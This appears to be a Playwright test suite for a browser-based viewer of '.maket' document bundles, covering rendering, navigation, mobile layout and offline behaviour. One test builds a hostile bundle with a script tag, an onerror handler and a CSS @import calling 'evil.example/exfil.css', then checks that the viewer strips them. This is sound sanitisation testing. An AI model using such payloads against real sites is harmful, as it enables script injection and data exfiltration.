import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import JSZip from "jszip";
import { expect, test } from "./coverage-test";

// Acceptance tests for the standalone viewer (/viewer.html): a .maket bundle
// opens fully client-side — one document renders through the clean Reader,
// assets load from object URLs, and collection members become logical pages.

const FIXTURE = path.join(
	path.dirname(fileURLToPath(import.meta.url)),
	"fixtures",
	"viewer-sample.maket",
);

async function openFixture(page: import("@playwright/test").Page) {
	await page.goto("/viewer.html");
	await page.setInputFiles('input[type="file"]', FIXTURE);
	await expect(page.locator('[data-doc="poster"]')).toBeVisible();
}

async function selectDocument(
	page: import("@playwright/test").Page,
	name: string,
) {
	await page.getByLabel("Document").click();
	await page.getByRole("option", { name, exact: true }).click();
	await expect(page.locator(`[data-doc="${name}"]`)).toBeVisible();
}

test.describe("Maket Viewer", () => {
	test("serves the drop zone with the local-only promise", async ({ page }) => {
		const response = await page.goto("/viewer.html");
		expect(response?.status()).toBe(200);
		await expect(page).toHaveTitle(/Maket Viewer/i);
		await expect(
			page.getByRole("button", { name: /choose a file/i }),
		).toBeVisible();
		await expect(page.getByText(/nothing is uploaded/i)).toBeVisible();
	});

	test("rejects a non-maket file with a clear error", async ({ page }) => {
		await page.goto("/viewer.html");
		await page.setInputFiles('input[type="file"]', {
			name: "bogus.maket",
			mimeType: "application/octet-stream",
			buffer: Buffer.from("not a bundle"),
		});
		await expect(page.getByText(/invalid \.maket file/i)).toBeVisible();
	});

	test("shows an unavailable state instead of a template for a missing collection", async ({
		page,
	}) => {
		const zip = new JSZip();
		zip.file(
			"manifest.json",
			JSON.stringify({
				version: 2,
				kind: "maket-bundle",
				exportedAt: "2026-08-10T00:00:00.000Z",
				documents: [
					{
						name: "orphan",
						category: "general",
						canvas: { w: 100, h: 100, background: "#fff" },
						pages: [
							{
								id: "page-1",
								name: "Orphan page",
								elements: [],
								html: "<p>{{ missing_value }}</p>",
								collection: { name: "missing" },
							},
						],
					},
				],
				chartes: [],
				collections: [],
			}),
		);
		const buffer = await zip.generateAsync({ type: "nodebuffer" });
		await page.goto("/viewer.html");
		await page.setInputFiles('input[type="file"]', {
			name: "orphan.maket",
			mimeType: "application/zip",
			buffer,
		});

		await expect(
			page.getByText('Collection "missing" is unavailable', { exact: true }),
		).toBeVisible();
		await expect(page.getByText("{{ missing_value }}")).toHaveCount(0);
		await expect(page.locator("[data-reader-page-index]")).toHaveCount(0);
	});

	test("opens a bundle: documents, charte and assets render", async ({
		page,
	}) => {
		await openFixture(page);

		// Reader renders one selected document at a time.
		await expect(page.locator('[data-doc="poster"]')).toBeVisible();
		await expect(page.locator('[data-doc="labels"]')).toHaveCount(0);

		// Page content renders with the charte variable applied.
		const title = page.locator('[data-id="e1"]', {
			hasText: "Grand Cru Smoked Salmon",
		});
		await expect(title).toBeVisible();
		await expect(title).toHaveCSS("color", "rgb(0, 169, 157)");

		// The bundled asset is served from an object URL, not the server.
		const logo = page.locator('img[data-name="logo"]');
		await expect(logo).toHaveAttribute("src", /^blob:/);
		// And it actually decoded (naturalWidth > 0).
		await expect
			.poll(() => logo.evaluate((el) => (el as HTMLImageElement).naturalWidth))
			.toBeGreaterThan(0);

		await expect(page.getByLabel("Document")).toHaveText("poster");
	});

	test("collection members render as successive passive pages", async ({
		page,
	}) => {
		await openFixture(page);
		await selectDocument(page, "labels");
		const labelsDoc = page.locator('[data-doc="labels"]');

		await expect(labelsDoc.locator(".page-canvas")).toHaveCount(3);
		await expect(labelsDoc.getByText("Salmon Classic")).toBeVisible();
		await expect(labelsDoc.getByText("Trout Fillet")).toBeVisible();
		await expect(labelsDoc.getByText("Herring Dill")).toBeVisible();
		await expect(page.getByRole("status")).toHaveText("Label - row 1, 1/3");
		await page
			.getByRole("button", { name: "Next page — Label - row 1" })
			.click();
		await expect(page.getByRole("status")).toHaveText("Label - row 2, 2/3");
		await page.evaluate(() =>
			(document.activeElement as HTMLElement | null)?.blur(),
		);
		await page.keyboard.press("End");
		await expect(page.getByRole("status")).toHaveText("Label - row 3, 3/3");
		await expect(page.getByRole("button", { name: "All rows" })).toHaveCount(0);
		await expect(page.getByRole("button", { name: "Open data" })).toHaveCount(
			0,
		);
	});

	test("read-only: clicking an element shows no edit toolbar", async ({
		page,
	}) => {
		await openFixture(page);
		await page
			.locator('[data-doc="poster"] [data-id="e1"]')
			.click({ force: true });
		await expect(page.locator(".element-toolbar")).toHaveCount(0);
	});

	test("strips active HTML and untrusted font imports from a hostile bundle", async ({
		page,
	}) => {
		const zip = new JSZip();
		zip.file(
			"manifest.json",
			JSON.stringify({
				version: 2,
				kind: "maket-bundle",
				exportedAt: "2026-01-01T00:00:00.000Z",
				documents: [
					{
						name: "evil",
						category: "general",
						canvas: { w: 100, h: 100, background: "#ffffff" },
						meta: { charte: "evil-charte" },
						pages: [
							{
								id: "p1",
								name: "P",
								elements: [],
								html:
									"<script>window.__pwned = 1;</script>" +
									'<img src="x" onerror="window.__pwned = 2" alt="" />' +
									'<div data-id="e1">Safe content</div>',
							},
						],
					},
				],
				chartes: [
					{
						name: "evil-charte",
						css: "@import url('https://evil.example/exfil.css');\n:root { --charte-color-bg: #fff; }",
					},
				],
				collections: [],
			}),
		);
		const buffer = await zip.generateAsync({ type: "nodebuffer" });

		const evilRequests: string[] = [];
		page.on("request", (request) => {
			if (request.url().includes("evil.example")) {
				evilRequests.push(request.url());
			}
		});

		await page.goto("/viewer.html");
		await page.setInputFiles('input[type="file"]', {
			name: "evil.maket",
			mimeType: "application/zip",
			buffer,
		});

		const canvas = page.locator('[data-doc="evil"] .page-canvas');
		await expect(canvas.getByText("Safe content")).toBeVisible();
		// Script tags are removed, event handlers scrubbed.
		await expect(canvas.locator("script")).toHaveCount(0);
		await expect(canvas.locator("img")).not.toHaveAttribute("onerror", /./);
		await expect
			.poll(() => page.evaluate(() => (window as any).__pwned))
			.toBeUndefined();
		// The untrusted @import never became a stylesheet link.
		await expect(
			page.locator('link[data-charte-font][href*="evil.example"]'),
		).toHaveCount(0);
		expect(evilRequests).toEqual([]);
	});

	test("renders every page of a multi-page document", async ({ page }) => {
		await openFixture(page);
		await selectDocument(page, "brochure");
		const brochure = page.locator('[data-doc="brochure"]');
		await expect(brochure.locator(".page-canvas")).toHaveCount(3);
		await expect(brochure.getByText("Our Smokehouse")).toBeVisible();
		await expect(
			brochure.getByText("Since 1987, slow oak smoke."),
		).toBeVisible();
		await expect(brochure.getByText("Visit us in Bergen.")).toBeVisible();
		// Page names are navigation metadata, not chrome under the page.
		await expect(brochure.getByText("Cover")).toHaveCount(0);
	});

	test("mobile: Reader fits without horizontal overflow and navigation stays usable", async ({
		page,
	}) => {
		await page.setViewportSize({ width: 320, height: 812 });
		await openFixture(page);
		// The fixed-layout page is scaled inside the viewport.
		const box = await page
			.locator('[data-doc="poster"] .page-canvas')
			.boundingBox();
		expect(box).not.toBeNull();
		if (box) {
			expect(box.x).toBeGreaterThanOrEqual(-1);
			expect(box.x + box.width).toBeLessThanOrEqual(321);
			expect(box.y).toBeGreaterThanOrEqual(-1);
		}
		expect(
			await page.evaluate(
				() => document.documentElement.scrollWidth <= window.innerWidth,
			),
		).toBe(true);
		await expect(page.getByLabel("Document")).toBeVisible();
		await page.getByRole("button", { name: "More viewer actions" }).click();
		await expect(
			page.getByRole("button", { name: "Open another file" }),
		).toBeVisible();
		await expect(
			page.getByRole("button", { name: "Toggle dark mode" }),
		).toBeVisible();
	});

	test("document menu supports typeahead and closes when tabbing away", async ({
		page,
	}) => {
		await openFixture(page);
		const picker = page.getByLabel("Document");
		await picker.focus();
		await picker.press("Enter");
		await expect(page.getByRole("listbox", { name: "Document" })).toBeVisible();
		await page.keyboard.press("b");
		await expect(page.getByRole("option", { name: "brochure" })).toBeFocused();
		await page.keyboard.press("Enter");
		await expect(page.locator('[data-doc="brochure"]')).toBeVisible();

		await picker.focus();
		await picker.press("Enter");
		await page.keyboard.press("Tab");
		await expect(page.getByRole("listbox", { name: "Document" })).toHaveCount(
			0,
		);
	});

	test("embed loads a same-origin bundle into the chrome-free Reader", async ({
		page,
	}) => {
		const bundle = await readFile(FIXTURE);
		await page.route("**/fixture.maket", (route) =>
			route.fulfill({
				status: 200,
				contentType: "application/zip",
				body: bundle,
			}),
		);
		await page.goto("/viewer.html?src=/fixture.maket&doc=labels&embed=1");

		const labelsDoc = page.locator('[data-doc="labels"]');
		await expect(labelsDoc.locator(".page-canvas")).toHaveCount(3);
		await expect(page.locator("[data-toolbar-shell]")).toHaveCount(0);
		await expect(
			page.getByRole("button", { name: "Open another file" }),
		).toHaveCount(0);
		await expect(
			page.locator('[data-reader-appearance="embed"]'),
		).toBeVisible();
	});

	test("makes no network requests after the bundle is opened", async ({
		page,
	}) => {
		await openFixture(page);
		const requests: string[] = [];
		page.on("request", (request) => {
			if (request.url().startsWith("blob:")) return;
			requests.push(request.url());
		});
		await selectDocument(page, "labels");
		await expect(
			page
				.locator('[data-doc="labels"] .page-canvas')
				.getByText("Salmon Classic"),
		).toBeVisible();
		expect(requests).toEqual([]);
	});
});
